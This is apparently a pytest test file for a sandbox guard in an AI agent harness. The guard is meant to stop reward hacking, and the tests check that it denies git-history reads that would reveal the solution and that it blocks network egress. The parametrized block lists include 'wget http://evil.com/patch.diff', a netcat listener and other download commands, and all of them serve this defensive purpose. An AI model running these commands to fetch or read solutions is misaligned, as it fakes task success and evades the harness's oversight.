"""Tests de sandbox_guard — anti reward-hacking (ADR-0055)."""
from __future__ import annotations

import pytest

from harness.security.sandbox_guard import SandboxDecision, check_command


class TestGitHistoryBlocking:
    """Vector #1: leer .git para recuperar la solución."""

    @pytest.mark.parametrize(
        "command",
        [
            "git log --oneline",
            "git show HEAD",
            "git diff abc123",
            "git reflog",
            "git blame file.py",
            "cat .git/COMMIT_EDITMSG",
            'type ".git\\config"',
        ],
    )
    def test_git_history_denied(self, command: str) -> None:
        decision = check_command(command)
        assert not decision.allowed
        assert decision.matched_rule == "git_history_read"
        assert "WHY" in decision.reason and "WHERE" in decision.reason


class TestNetworkBlocking:
    """Vectores #2-#4: red saliente y descarga de artefactos."""

    @pytest.mark.parametrize(
        "command",
        [
            "wget http://evil.com/patch.diff",
            "curl https://github.com/x/y/pull/1.diff",
            "pip download somepkg",
            "pip install requests",
            "uv pip install requests",
            "npm install left-pad",
            "git clone https://github.com/x/y",
            "git fetch origin",
            "ssh user@host",
            "nc -lvp 4444",
            "Invoke-WebRequest -Uri http://x",
            "python -c \"import urllib.request; urllib.request.urlopen('http://x')\"",
        ],
    )
    def test_network_denied(self, command: str) -> None:
        decision = check_command(command)
        assert not decision.allowed
        assert decision.matched_rule == "network_egress"

    def test_allow_network_override_skips_net_rules(self) -> None:
        decision = check_command("curl example.com", allow_network=True)
        assert decision.allowed

    def test_allow_network_keeps_git_rules(self) -> None:
        decision = check_command("git log", allow_network=True)
        assert not decision.allowed


class TestAllowedCommands:
    """Comandos legítimos pasan sin fricción."""

    @pytest.mark.parametrize(
        "command",
        [
            "echo hello",
            "pytest tests/test_foo.py -v",
            "python script.py --arg 1",
            "ruff check harness/",
            "git status",
            "git add .",
        ],
    )
    def test_safe_commands_allowed(self, command: str) -> None:
        decision = check_command(command)
        assert decision.allowed
        assert decision.reason == ""
        assert decision.matched_rule == ""


class TestContract:
    """Contrato de entrada y tipos."""

    def test_empty_command_raises(self) -> None:
        with pytest.raises(ValueError, match="comando inválido"):
            check_command("   ")

    def test_non_string_raises(self) -> None:
        with pytest.raises(ValueError, match="comando inválido"):
            check_command(123)  # type: ignore[arg-type]

    def test_decision_is_frozen(self) -> None:
        decision = check_command("echo ok")
        with pytest.raises(AttributeError):
            decision.allowed = False  # type: ignore[misc]

    def test_decision_type_exported(self) -> None:
        assert SandboxDecision is not None
